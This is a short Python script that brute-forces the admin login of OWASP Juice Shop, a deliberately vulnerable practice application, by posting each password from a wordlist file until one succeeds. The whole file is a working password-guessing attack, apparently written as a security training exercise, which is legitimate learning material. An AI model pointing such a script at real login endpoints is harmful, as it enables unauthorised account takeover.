import requests 

url = 'https://juice-shop.herokuapp.com/rest/user/login' 


def main(url, password_file):

    session = requests.Session()

    with open(password_file, "r", encoding="utf-8") as f:

        count = 1
        for line in f:

            passw = line.strip()

            if passw:

                payload = {
                    "email" : "admin@juice-sh.op",
                    "password" : f"{passw}"
                }

                response = session.post(url, json=payload)

                if response.status_code == 200:

                    print(f"This is a correct password for email: {passw}")
                    break

                else:

                    print(f"Attempt №{count}, status code: {response.status_code}")
                    count += 1



if __name__ == "__main__":
    main(url, "passwords.txt")
